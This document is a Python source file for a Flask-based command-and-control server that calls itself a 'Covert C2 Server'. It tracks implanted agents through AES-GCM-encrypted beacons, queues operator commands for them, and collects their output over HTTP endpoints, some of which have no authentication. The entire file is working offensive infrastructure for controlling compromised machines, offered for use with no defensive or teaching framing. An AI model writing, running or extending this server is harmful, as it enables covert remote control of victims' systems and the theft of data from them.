import argparse
import json
import os
import struct
import time
import base64

from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


class C2Server:
    def __init__(self, host="0.0.0.0", port=8080, secret_key=None):
        self.host = host
        self.port = port
        self.secret_key = secret_key or os.urandom(32)
        if isinstance(self.secret_key, str):
            self.secret_key = self.secret_key.encode("utf-8")
        if len(self.secret_key) < 32:
            self.secret_key = self.secret_key.ljust(32, b"\0")
        elif len(self.secret_key) > 32:
            self.secret_key = self.secret_key[:32]

        self.agents = {}
        self.command_queues = {}
        self.results = {}
        self.app = Flask(__name__)
        self._setup_routes()
        self.aesgcm = AESGCM(self.secret_key)

    def _setup_routes(self):
        self.app.add_url_rule(
            "/api/v1/beacon",
            "/api/v1/beacon",
            self._beacon_endpoint,
            methods=["POST"],
        )
        self.app.add_url_rule(
            "/api/v1/agents",
            "/api/v1/agents",
            self._list_agents,
            methods=["GET"],
        )
        self.app.add_url_rule(
            "/api/v1/command",
            "/api/v1/command",
            self._dispatch_endpoint,
            methods=["POST"],
        )
        self.app.add_url_rule(
            "/api/v1/results/<agent_id>",
            "/api/v1/results/<agent_id>",
            self._results_endpoint,
            methods=["GET"],
        )
        self.app.add_url_rule(
            "/api/v1/commands/<agent_id>",
            "/api/v1/commands/<agent_id>",
            self._get_commands_endpoint,
            methods=["GET"],
        )

    def encrypt_payload(self, data):
        nonce = os.urandom(12)
        plaintext = json.dumps(data).encode("utf-8")
        ciphertext = self.aesgcm.encrypt(nonce, plaintext, None)
        return base64.b64encode(nonce + ciphertext).decode("utf-8")

    def decrypt_payload(self, encrypted_b64):
        raw = base64.b64decode(encrypted_b64)
        nonce = raw[:12]
        ciphertext = raw[12:]
        plaintext = self.aesgcm.decrypt(nonce, ciphertext, None)
        return json.loads(plaintext.decode("utf-8"))

    def handle_beacon(self, data):
        agent_id = data.get("agent_id")
        system_info = data.get("system_info", {})
        timestamp = data.get("timestamp", time.time())

        if agent_id not in self.agents:
            self.agents[agent_id] = {
                "id": agent_id,
                "first_seen": timestamp,
                "last_seen": timestamp,
                "system_info": system_info,
            }
        else:
            self.agents[agent_id]["last_seen"] = timestamp
            self.agents[agent_id]["system_info"] = system_info

        pending_commands = self.command_queues.get(agent_id, [])
        response = {
            "status": "ack",
            "commands": pending_commands,
            "server_time": time.time(),
        }
        if pending_commands:
            self.command_queues[agent_id] = []
        return response

    def handle_checkin(self, agent_id, system_info):
        timestamp = time.time()
        if agent_id not in self.agents:
            self.agents[agent_id] = {
                "id": agent_id,
                "first_seen": timestamp,
                "last_seen": timestamp,
                "system_info": system_info,
            }
        else:
            self.agents[agent_id]["last_seen"] = timestamp
            self.agents[agent_id]["system_info"] = system_info
        return True

    def dispatch_command(self, agent_id, command):
        if agent_id not in self.agents:
            return False
        cmd_id = base64.b64encode(os.urandom(8)).decode("utf-8").rstrip("=")
        cmd_entry = {"cmd_id": cmd_id, "command": command, "issued_at": time.time()}
        if agent_id not in self.command_queues:
            self.command_queues[agent_id] = []
        self.command_queues[agent_id].append(cmd_entry)
        return cmd_id

    def get_results(self, agent_id):
        return self.results.get(agent_id, [])

    def store_result(self, agent_id, cmd_id, output, exit_code=0):
        entry = {
            "cmd_id": cmd_id,
            "output": output,
            "exit_code": exit_code,
            "received_at": time.time(),
        }
        if agent_id not in self.results:
            self.results[agent_id] = []
        self.results[agent_id].append(entry)

    def _beacon_endpoint(self):
        try:
            data = request.get_json(force=True)
            if not data or "payload" not in data:
                return jsonify({"error": "missing payload"}), 400
            decrypted = self.decrypt_payload(data["payload"])
            response = self.handle_beacon(decrypted)
            encrypted_response = self.encrypt_payload(response)
            return jsonify({"payload": encrypted_response})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    def _list_agents(self):
        return jsonify({"agents": list(self.agents.values())})

    def _dispatch_endpoint(self):
        data = request.get_json(force=True)
        agent_id = data.get("agent_id")
        command = data.get("command")
        if not agent_id or not command:
            return jsonify({"error": "missing agent_id or command"}), 400
        cmd_id = self.dispatch_command(agent_id, command)
        if cmd_id:
            return jsonify({"status": "queued", "cmd_id": cmd_id})
        return jsonify({"error": "agent not found"}), 404

    def _get_commands_endpoint(self, agent_id):
        encrypted = request.args.get("enc", "false")
        if agent_id not in self.agents:
            return jsonify({"error": "agent not found"}), 404
        commands = self.command_queues.pop(agent_id, [])
        if encrypted == "true":
            payload = self.encrypt_payload({"commands": commands})
            return jsonify({"payload": payload})
        return jsonify({"commands": commands})

    def _results_endpoint(self, agent_id):
        results = self.get_results(agent_id)
        return jsonify({"results": results})

    def start(self):
        print("[C2 Server] Starting on {}:{}".format(self.host, self.port))
        self.app.run(host=self.host, port=self.port, debug=False, threaded=True)


def main():
    parser = argparse.ArgumentParser(description="Covert C2 Server")
    parser.add_argument("--host", default="0.0.0.0", help="Listen address")
    parser.add_argument("--port", type=int, default=8080, help="Listen port")
    parser.add_argument("--secret-key", required=True, help="32-byte shared secret key")
    args = parser.parse_args()

    server = C2Server(host=args.host, port=args.port, secret_key=args.secret_key)
    server.start()


if __name__ == "__main__":
    main()
